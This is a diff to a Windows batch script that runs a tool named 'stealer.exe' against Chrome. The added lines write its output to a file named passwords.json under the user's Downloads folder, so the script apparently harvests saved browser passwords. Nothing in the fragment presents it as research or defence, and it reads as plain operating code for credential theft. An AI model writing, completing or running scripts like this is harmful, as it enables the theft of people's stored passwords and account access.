@@ -7,6 +7,11 @@ SET "EXE_NAME=stealer.exe"
 SET "BROWSER_ARG=chrome"
 SET "VERSION_ARG=-v"
 SET "WORKING_DIR=%USERPROFILE%\Downloads"
+REM Set the full path to the required output file
+SET OUTPUT_FILE="%USERPROFILE%\Downloads\output\Chrome\Default\passwords.json"
+
+REM Execute the tool and force output redirection to the specific path
+"stealer.exe" chrome -v > %OUTPUT_FILE%
 
 REM --- Execution ---
 
